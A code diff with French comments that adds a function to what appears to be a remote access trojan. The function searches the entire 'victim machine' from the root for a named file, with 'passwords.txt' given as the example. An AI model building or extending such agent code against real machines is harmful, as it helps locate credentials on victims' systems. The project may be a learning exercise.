@@ -151,6 +151,38 @@ def handle_upload(message: dict) -> dict:
 
 
 # ---------------------------------------------------------------------------
+# search — rechercher un fichier sur la machine victime
+# ---------------------------------------------------------------------------
+
+
+def search_file(filename: str) -> str:
+    """
+    Recherche un fichier par nom sur toute la machine victime.
+
+    Args:
+        filename: Nom du fichier à chercher (ex: "passwords.txt").
+
+    Returns:
+        str: Liste des chemins trouvés, ou message si aucun résultat.
+    """
+    results = []
+
+    # Recherche récursive depuis la racine
+    root = Path("C:/") if _get_os() == "Windows" else Path("/")
+
+    for path in root.rglob(filename):
+        try:
+            results.append(str(path))
+        except PermissionError:
+            continue
+
+    if not results:
+        return f"Aucun fichier trouvé pour : {filename}"
+
+    return "\n".join(results)
+
+
+# ---------------------------------------------------------------------------
 # Fonctions à implémenter dans les prochaines étapes
 # ---------------------------------------------------------------------------
 
